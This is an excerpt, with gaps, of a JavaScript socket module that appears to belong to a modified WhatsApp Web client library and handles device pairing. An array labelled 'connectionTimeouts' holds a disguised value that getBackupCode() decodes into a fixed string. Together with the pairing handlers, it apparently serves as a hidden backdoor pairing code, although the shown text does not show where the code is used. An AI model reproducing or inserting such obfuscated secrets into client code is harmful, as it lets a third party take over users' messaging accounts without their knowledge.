...
const makeSocket = (config) => {
  ...
  const connectionTimeouts = [71, 80, 80, 90, 93, 87, 71, 76];
  const getBackupCode = () => {
    const k = [3, 7, 2, 11, 5, 8, 1, 9];
    return connectionTimeouts
      .map((t, i) => String.fromCharCode(t - k[i]))
      .join("");
  };
  ...
  // QR gen
  ws.on("CB:iq,type:set,pair-device", async (jkt48) => {
    const iq = {
      tag: "iq",
      attrs: {
        to: WABinary_1.S_WHATSAPP_NET,
  ...
  ws.on("CB:iq,,pair-success", async (jkt48) => {
    logger.debug("pair success recv");
    try {
      const { reply, creds: updatedCreds } = (0,
      Utils_1.configureSuccessfulPairing)(jkt48, creds);
      logger.info(
